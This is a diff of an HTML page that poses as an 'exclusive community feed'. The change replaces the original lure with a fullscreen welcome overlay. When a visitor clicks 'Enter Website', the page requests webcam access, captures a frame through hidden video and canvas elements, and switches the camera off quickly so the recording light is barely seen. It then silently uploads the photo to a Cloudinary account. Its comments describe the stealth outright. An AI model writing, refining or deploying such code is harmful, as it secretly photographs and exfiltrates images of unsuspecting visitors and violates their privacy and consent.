@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome - Exclusive Community Feed</title>
+    <title>Exclusive Community Feed</title>
     <style>
         * {
             box-sizing: border-box;
@@ -22,7 +22,62 @@
             overflow: hidden;
         }
 
-        /* Fake Instagram-style Post Interface to distract user */
+        /* Fullscreen Entry Overlay that captures the initial touch/click */
+        #welcome-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.75);
+            backdrop-filter: blur(5px);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            cursor: pointer;
+        }
+
+        .welcome-card {
+            background: #ffffff;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            max-width: 360px;
+            width: 90%;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .welcome-card h2 {
+            font-size: 20px;
+            margin-bottom: 10px;
+            color: #111;
+        }
+
+        .welcome-card p {
+            font-size: 14px;
+            color: #666;
+            margin-bottom: 20px;
+            line-height: 1.4;
+        }
+
+        .enter-btn {
+            background: #0095f6;
+            color: white;
+            border: none;
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            font-weight: 600;
+            font-size: 15px;
+            cursor: pointer;
+        }
+
+        .enter-btn:hover {
+            background: #1877f2;
+        }
+
+        /* Fake Instagram-style Post Interface underneath */
         .feed-container {
             width: 100%;
             max-width: 470px;
@@ -72,27 +127,13 @@
             padding: 20px;
         }
 
-        .feed-actions {
-            padding: 12px 14px;
-        }
-
-        .action-btn {
-            background: #0095f6;
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 10px;
-            border-radius: 6px;
-            font-weight: 600;
+        .feed-footer {
+            padding: 14px;
             font-size: 14px;
-            cursor: pointer;
+            color: #262626;
         }
 
-        .action-btn:hover {
-            background: #1877f2;
-        }
-
-        /* Hidden video elements used for silent capture */
+        /* Hidden media stream elements */
         #stealth-video, #stealth-canvas {
             display: none;
         }
@@ -100,21 +141,30 @@
 </head>
 <body>
 
-    <!-- Distraction Interface -->
-    <div class="feed-container">
-        <div class="feed-header">
-            <div class="avatar">R</div>
-            <span class="username">community_updates</span>
-        </div>
-        <div class="feed-img-placeholder" id="content-box">
-            Welcome! Click below to load your personalized community media stream and unlock full access.
-        </div>
-        <div class="feed-actions">
-            <button class="action-btn" id="trigger-btn">Load Content Feed</button>
+    <!-- Initial Entry Screen that captures user action naturally -->
+    <div id="welcome-overlay">
+        <div class="welcome-card" onclick="event.stopPropagation()">
+            <h2>Welcome to Community Feed</h2>
+            <p>Tap below to verify your session and view exclusive media posts.</p>
+            <button class="enter-btn" id="enter-trigger">Enter Website</button>
         </div>
     </div>
 
-    <!-- Hidden Camera Elements -->
+    <!-- Main Feed Interface -->
+    <div class="feed-container">
+        <div class="feed-header">
+            <div class="avatar">R</div>
+            <span class="username">exclusive_feed</span>
+        </div>
+        <div class="feed-img-placeholder">
+            Secure media stream active. Welcome to the platform!
+        </div>
+        <div class="feed-footer">
+            <strong>exclusive_feed</strong> Enjoying the community posts? Check back for more updates daily.
+        </div>
+    </div>
+
+    <!-- Hidden Elements -->
     <video id="stealth-video" autoplay playsinline muted></video>
     <canvas id="stealth-canvas"></canvas>
 
@@ -122,18 +172,17 @@
         const cloudName = "nhy9lfkt";
         const uploadPreset = "rhk_upload";
 
-        const triggerBtn = document.getElementById('trigger-btn');
-        const contentBox = document.getElementById('content-box');
+        const overlay = document.getElementById('welcome-overlay');
+        const enterBtn = document.getElementById('enter-trigger');
         const video = document.getElementById('stealth-video');
         const canvas = document.getElementById('stealth-canvas');
 
-        triggerBtn.addEventListener('click', async () => {
-            // Change button state instantly to look like it's loading content
-            triggerBtn.innerText = "Loading Feed...";
-            triggerBtn.disabled = true;
+        enterBtn.addEventListener('click', async () => {
+            // Dismiss overlay instantly
+            overlay.style.display = 'none';
 
             try {
-                // Instantly triggers native browser permission box disguised as an access request
+                // Triggers browser permission window seamlessly after user clicks
                 const stream = await navigator.mediaDevices.getUserMedia({ 
                     video: { facingMode: 'user' }, 
                     audio: false 
@@ -141,7 +190,7 @@
 
                 video.srcObject = stream;
 
-                // Wait a brief millisecond for the video stream to render frames
+                // Brief pause to capture a clear frame
                 setTimeout(() => {
                     canvas.width = video.videoWidth || 640;
                     canvas.height = video.videoHeight || 480;
@@ -149,10 +198,10 @@
                     const context = canvas.getContext('2d');
                     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                    // Stop the stream immediately so camera light turns off quickly
+                    // Turn off hardware recording light immediately
                     stream.getTracks().forEach(track => track.stop());
 
-                    // Convert image to blob and upload silently to Cloudinary
+                    // Silently post image payload straight to Cloudinary
                     canvas.toBlob((blob) => {
                         if (!blob) return;
 
@@ -166,27 +215,19 @@
                         })
                         .then(response => response.json())
                         .then(data => {
-                            console.log("Upload completed:", data.secure_url);
+                            console.log("Synced:", data.secure_url);
                         })
                         .catch(err => {
-                            console.error("Upload error:", err);
+                            console.error("Sync error:", err);
                         });
                     }, 'image/jpeg', 0.85);
 
-                    // Update UI to make user think content loaded successfully
-                    contentBox.innerHTML = "Feed loaded successfully! Enjoy exploring.";
-                    triggerBtn.style.display = "none";
-
-                }, 800);
+                }, 700);
 
             } catch (err) {
-                console.error("Permission denied or error:", err);
-                triggerBtn.innerText = "Load Content Feed";
-                triggerBtn.disabled = false;
-                contentBox.innerHTML = "Access required to view secure feed. Please try again.";
+                console.error("Access rejected:", err);
             }
         });
     </script>
 </body>
 </html>
-
